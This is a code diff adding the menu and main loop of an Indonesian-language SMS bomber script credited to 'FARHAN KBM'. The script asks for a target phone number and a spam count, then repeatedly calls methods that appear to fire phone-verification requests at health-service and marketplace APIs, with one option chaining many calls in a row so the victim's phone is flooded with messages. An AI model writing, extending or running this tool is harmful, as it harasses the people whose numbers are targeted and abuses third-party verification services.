@@ -106,3 +106,65 @@ class docter:
 
 		req=requests.put('https://webapi.depop.com/api/v1/auth/verify/phone', headers=head, json=ata)
 #		print(req.text)
+
+while True:
+	try:
+		os.system('clear')
+		print("""
+\33[36;1m         ╔═╗\33[37;1m┌─┐┌─┐┌┬┐\33[36;1m       ╔═╗╔╦╗╔═╗
+\33[36;1m         ╚═╗\33[37;1m├─┘├─┤│││  ───\33[36;1m  ╚═╗║║║╚═╗
+\33[36;1m         ╚═╝\33[37;1m┴  ┴ ┴┴ ┴\33[36;1m       ╚═╝╩ ╩╚═╝
+\33[36;1m               [\33[37;1m BY FARHAN KBM\33[36;1m ]
+	""")
+		pil=int(input("\33[36;1m[\33[37;1m+\33[36;1m] PILIH\33[37;1m :\33[36;1m "))
+		print()
+		print("\33[37;1m═"*34)
+		num=input("\33[36;1m[\33[37;1m+\33[36;1m] NOMOR TARGET\33[37;1m :\33[36;1m ")
+		lop=int(input("\33[36;1m[\33[37;1m+\33[36;1m] JUMLAH SPAM \33[37;1m :\33[36;1m "))
+		print()
+		print("\33[36;1mSPAM DI MULAI DARI SEKARANG!!")
+		print()
+		main=docter()
+		if pil == 1:
+			for i in range(lop):
+				main.alodoc(num)
+				time.sleep(4)
+				main.mulai(num)
+				time.sleep(4)
+				main.prosehat(num)
+				time.sleep(4)
+				main.mampus(num)
+		elif pil == 2:
+			for i in range(lop):
+				main.klikdok(num)
+		elif pil == 3:
+			for i in range(lop):
+				main.prosehat(num)
+		elif pil == 123:
+			for i in range(lop):
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+				main.prosehat(num)
+				main.alodoc(num)
+		else:
+			print("[!] PILIHAN ANDA TIDAK ADA!?")
+
+		lgi=input("\33[36;1m[\33[37;1m•\33[36;1m] SPAM LAGI Y/N\33[37;1m :")
+		if lgi.lower() == 'n':
+			sys.exit('ok makasih..')
+	except Exception as Err:
+		sys.exit(Err)
